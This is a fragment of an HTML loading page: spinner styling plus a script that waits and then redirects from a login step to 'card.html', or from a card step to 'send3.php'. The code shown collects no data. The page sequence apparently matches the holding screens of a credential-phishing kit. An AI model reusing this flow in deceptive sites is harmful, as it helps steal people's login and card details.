    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #002788;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .loader-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 20px;
        }

        .loader-logo {
            display: inline-block;
            width: 200px;
            height: auto;
            margin-bottom: 50px;
        }

        .loader-logo svg {
            width: 100%;
            height: auto;
        }

        .loader-logo .st0 {
            fill: #E57399;
        }

        .loader-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 8px solid #002788;
            border-top: 8px solid #E57399;
            border-right: 8px solid #E57399;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            color: white;
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 15px;
        }

        .loader-description {
            color: white;
            font-size: 14px;
            line-height: 1.6;
            max-width: 400px;
            margin: 0 auto;
        }

        .loader-footer {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            text-align: left;
            color: rgba(255, 255, 255, 0.7);
            font-size: 12px;
            padding: 20px;
            line-height: 1.6;
        }

        .loader-footer-address {
            margin-bottom: 10px;
        }

        .loader-footer-links {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .loader-footer-links a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
        }

        .loader-footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>

    <script>
        // Get the 'from' parameter from URL
        const urlParams = new URLSearchParams(window.location.search);
        const from = urlParams.get('from');
        
        let waitTime = 13000; // 13 seconds from card
        let redirectTo = 'send3.php?from=card';
        
        if (from === 'login') {
            waitTime = 1000; // 4 seconds from login
            redirectTo = 'card.html';
        }
        
        // Wait for the specified time, then redirect
        setTimeout(function() {
            if (from === 'card') {
                // Redirect to app.html after 13 seconds
                window.location.href = redirectTo;
            } else {
                // Redirect to card.html after 4 seconds
                window.location.href = redirectTo;
            }
        }, waitTime);
    </script>
